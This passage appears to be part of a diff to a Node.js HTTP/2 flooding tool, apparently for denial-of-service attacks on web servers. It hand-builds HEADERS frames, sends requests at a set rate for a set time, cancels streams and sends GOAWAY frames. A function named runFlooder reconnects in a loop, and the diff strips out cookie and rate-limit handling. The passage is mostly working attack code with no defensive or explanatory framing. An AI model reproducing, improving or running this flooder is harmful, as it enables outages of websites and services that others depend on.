                                                 parent:0,
                                                 exclusive: true,
-						                        endStream: true,
-                                                dependsOn: 0,
+						                                    endStream: true,
+                                                depends_on: 0,
                                                
                                             });
-                                            req.setEncoding('utf8');
-                                            req.on('response', (res) => {
-                                            req.close(http2.constants.NO_ERROR);
-                                            req.destroy();
-                                            if (enabled('cookie')) {
-                                                const cookies = res.headers['set-cookie']; 
-                                                if (Array.isArray(cookies) && cookies.length > 32) {
-                                                    headers['cookie'] = cookies.join('; ');
-                                                    console.log('Cookies:', cookies);
-                                                }
-                                            }
                             
-                                            resolve();
+                                            req.on('response', (response) => {
+                                                req.close(http2.constants.NO_ERROR);
+                                                req.destroy();
+                                                resolve();
                                             });
                             
                                             req.on('end', () => {
@@ -810,7 +660,7 @@ const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(
                                                 if (count === args.time * args.Rate) {
                                                     clearInterval(intervalId);
                                                     client.close(http2.constants.NGHTTP2_CANCEL);
-                                                    client.goaway(1, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('GO AWAY'));
+                                                    client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('NATRAL'));
                                                 } else if (count === args.Rate) {
                                                     client.close(http2.constants.NGHTTP2_CANCEL);
                                                     client.destroy();
@@ -820,7 +670,6 @@ const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(
                                             });
                             
                                             req.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
-                                            
                                         }));
                             
                                         const packed = Buffer.concat([
@@ -828,7 +677,7 @@ const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(
                                             hpack.encode(head)
                                         ]);
                             
-                                         let streamId = 1;
+                                        let streamId = 1;
                                          let streamIdReset = 0;
                                          const flags = 0x1 | 0x4 | 0x8 | 0x20;
                                          const encodedFrame = encodeFrame(streamId, 1, packed, flags);
@@ -848,35 +697,18 @@ const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(
                             } 
                                         streamIdReset+= 2;
                                         streamId += 2;
-
-
-                                        const status = res[':status'];
-                                        if (status === 429 && enabled('ratelimit')) {
-                                        ratelimit.push({timestamp: Date.now(), request: requestPromise });
-                                        client.destroy();
-                                         return;
-                                         }
-
-
-                                        requests.push({ requestPromise, frame });
-                                    
+                                        requests.push({ requestPromise, frame , currenthead });
+                                    }
                             
                                     await Promise.all(requests.map(({ requestPromise }) => requestPromise));
                                 }
                             }
                             await increaseRequestRate(client, head, args);
                         }
-                           
                             sendRequests();
-                    },500);
+                    }, 500);
                 });
     
-          client.on('streamClosed', (streamId) => {
-            client.destroy();
-            tlsSocket.destroy();
-            connection.destroy();
-            return runFlooder();
-        });
         client.on("close", () => {
             client.destroy();
             tlsSocket.destroy();
